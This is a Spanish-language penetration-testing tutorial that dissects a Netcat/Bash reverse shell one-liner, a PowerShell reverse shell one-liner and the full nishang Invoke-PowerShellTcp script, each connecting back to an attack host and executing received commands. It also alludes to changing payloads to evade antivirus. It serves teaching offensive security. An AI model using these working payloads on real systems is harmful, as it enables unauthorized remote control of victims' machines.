¿Alguna vez has enviado un email o mensaje de texto a alguien?

Probablemente la mayoría de nosotros lo hemos hecho. El mensaje que enviamos en un email o mensaje de texto es el payload del paquete mientras se envía a través del vasto Internet. En computación, el payload es el mensaje destinado. En seguridad de la información, el payload es el comando y/o código que explota la vulnerabilidad en un OS y/o aplicación. El payload es el comando y/o código que realiza la acción maliciosa desde una perspectiva defensiva. Como vimos en la sección de reverse shells, Windows Defender detuvo la ejecución de nuestro payload de PowerShell porque fue considerado código malicioso.

Ten en cuenta que cuando entregamos y ejecutamos payloads, al igual que cualquier otro programa, le damos al computador objetivo instrucciones sobre lo que necesita hacer. Los términos "malware" y "malicious code" romantizan el proceso y lo hacen más misterioso de lo que es. Cada vez que trabajemos con payloads, desafiémonos a nosotros mismos a explorar lo que el código y los comandos realmente están haciendo. Empezaremos este proceso desglosando las líneas de comando con las que trabajamos anteriormente:

---

## One-Liners Examined

### Netcat/Bash Reverse Shell One-liner

```r
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Los comandos anteriores componen una línea de comando común emitida en un sistema Linux para servir una Bash shell en un socket de red utilizando un listener de Netcat. Usamos esto anteriormente en la sección de Bind Shells. A menudo se copia y pega, pero no siempre se entiende. Desglosemos cada parte de la línea de comando:

### Remove /tmp/f

```r
rm -f /tmp/f; 
```

Elimina el archivo `/tmp/f` si existe, `-f` hace que `rm` ignore los archivos inexistentes. El punto y coma (`;`) se usa para ejecutar el comando secuencialmente.

### Make A Named Pipe

```r
mkfifo /tmp/f; 
```

Crea un [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) en la ubicación especificada. En este caso, /tmp/f es el FIFO named pipe file, el punto y coma (`;`) se usa para ejecutar el comando secuencialmente.

### Output Redirection

```r
cat /tmp/f | 
```

Concatena el FIFO named pipe file /tmp/f, el pipe (`|`) conecta la salida estándar de cat /tmp/f a la entrada estándar del comando que viene después del pipe (`|`).

### Set Shell Options

```r
/bin/bash -i 2>&1 | 
```

Especifica el intérprete de comandos usando la opción `-i` para asegurar que la shell sea interactiva. `2>&1` asegura que el flujo de datos de error estándar (`2`) y el flujo de datos de salida estándar (`1`) se redirijan al comando que sigue al pipe (`|`).

### Open a Connection with Netcat

```r
nc 10.10.14.12 7777 > /tmp/f  
```

Usa Netcat para enviar una conexión a nuestro host de ataque `10.10.14.12` que escucha en el puerto `7777`. La salida será redirigida (`>`) a /tmp/f, sirviendo la Bash shell a nuestro listener de Netcat en espera cuando se ejecute el comando de reverse shell.

---
## PowerShell One-liner Explained

Las shells y payloads que elegimos usar dependen en gran medida del OS que estamos atacando. Ten esto en cuenta mientras continuamos a lo largo del módulo. Fuimos testigos de esto en la sección de reverse shells al establecer una reverse shell con un sistema Windows utilizando PowerShell. Desglosemos la línea de comando que usamos:

### Powershell One-liner

```r
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Disectaremos el comando de PowerShell bastante grande que puedes ver arriba. Puede parecer mucho, pero con suerte podemos desmitificarlo un poco.

### Calling PowerShell

```r
powershell -nop -c 
```

Ejecuta `powershell.exe` sin perfil (`nop`) y ejecuta el bloque de comandos/script (`-c`) contenido en las comillas. Este comando en particular se emite dentro de command-prompt, por lo que PowerShell está al principio del comando. Es bueno saber cómo hacer esto si descubrimos una vulnerabilidad de Remote Code Execution que nos permite ejecutar comandos directamente en `cmd.exe`.

### Binding A Socket

```r
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```

Establece/evalúa la variable `$client` igual a (`=`) el cmdlet `New-Object`, que crea una instancia del objeto .NET framework `System.Net.Sockets.TCPClient`. El objeto del framework .NET se conectará con el socket TCP listado en los paréntesis `(10.10.14.158,443)`. El punto y coma (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### Setting The Command Stream

```r
$stream = $client.GetStream();
```

Establece/evalúa la variable `$stream` igual a (`=`) la variable `$client` y el método del framework .NET llamado [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) que facilita las comunicaciones de red. El punto y coma (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### Empty Byte Stream

```r
[byte[]]$bytes = 0..65535|%{0}; 
```

Crea un tipo de array byte (`[]`) llamado `$bytes` que devuelve 65,535 ceros como los valores en el array. Esto es esencialmente un byte stream vacío que se dirigirá al listener TCP en una caja de ataque en espera de una conexión.

### Stream Parameters

```r
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Inicia un bucle `while` que contiene la variable `$i` establecida igual a (`=`) el método `$stream.Read` del framework .NET. Los parámetros: buffer (`$bytes`), offset (`0`) y count (`$bytes.Length`) están definidos dentro de los paréntesis del método.

### Set The Byte Encoding

```r
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Establece/evalúa la variable `$data` igual a (`=`) una clase del framework .NET de codificación [ASCII](https://en.wikipedia.org/wiki/ASCII) que se utilizará junto con el método `GetString` para codificar el byte stream (`$bytes`) en ASCII. En resumen, lo que escribamos no solo se transmitirá y recibirá como bits vacíos, sino que se codificará como texto ASCII. El punto y coma (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### Invoke-Expression

```r
$sendback = (iex $data 2>&1 | Out-String ); 
```

Establece/evalúa la variable `$sendback` igual a (`=`) el cmdlet Invoke-Expression (`iex`) contra la variable `$data`, luego redirige el error estándar (`2>`) y la salida estándar (`1`) a través de un pipe (`|`) al cmdlet `Out-String` que convierte los objetos de entrada en cadenas de texto. Debido a que se usa Invoke-Expression, todo lo almacenado en $data se ejecutará en la computadora local. El punto y coma (`;`) asegura que los comandos y el código se ejecuten secuencialmente.

### Show Working Directory

```r
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

Establece/evalúa la variable `$sendback2` igual a (`=`) la variable `$sendback` más (`+`) la cadena PS (`'PS'`) más (`+`) la ruta al directorio de trabajo (`(pwd).path`) más (`+`) la cadena `'> '`. Esto resultará en que el prompt de la shell sea PS C:\workingdirectoryofmachine >. El punto y coma (`;`) asegura que los comandos y el código se ejecuten secuencialmente. Recuerda que el operador + en programación combina cadenas cuando no se utilizan valores numér

icos, con la excepción de ciertos lenguajes como C y C++ donde se necesitaría una función.

### Sets Sendbyte

```r
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Establece/evalúa la variable `$sendbyte` igual a (`=`) el byte stream codificado en ASCII que usará un cliente TCP para iniciar una sesión de PowerShell con un listener de Netcat ejecutándose en la caja de ataque.

### Terminate TCP Connection

```r
$client.Close()"
```

Este es el método [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) que se usará cuando la conexión se termine.

La línea de comando que acabamos de examinar juntos también puede ejecutarse en forma de un script de PowerShell (`.ps1`). Podemos ver un ejemplo de esto viendo el código fuente a continuación. Este código fuente es parte del proyecto [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1):


```r
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

---
## Payloads Take Different Shapes and Forms

Entender lo que hacen los diferentes tipos de payloads puede ayudarnos a entender por qué AV nos está bloqueando la ejecución y darnos una idea de lo que podríamos necesitar cambiar en nuestro código para eludir las restricciones. Esto es algo que exploraremos más adelante en este módulo. Por ahora, comprende que los payloads que usamos para obtener una shell en un sistema estarán determinados en gran medida por el OS, los lenguajes intérpretes de shell e incluso los lenguajes de programación presentes en el target.

No todos los payloads son líneas de comando y se implementan manualmente como los que estudiamos en esta sección. Algunos se generan utilizando frameworks de ataque automatizados y se implementan como un ataque preempaquetado/automatizado para obtener una shell. Como en el muy poderoso `Metasploit-framework`, con el que trabajaremos en la siguiente sección.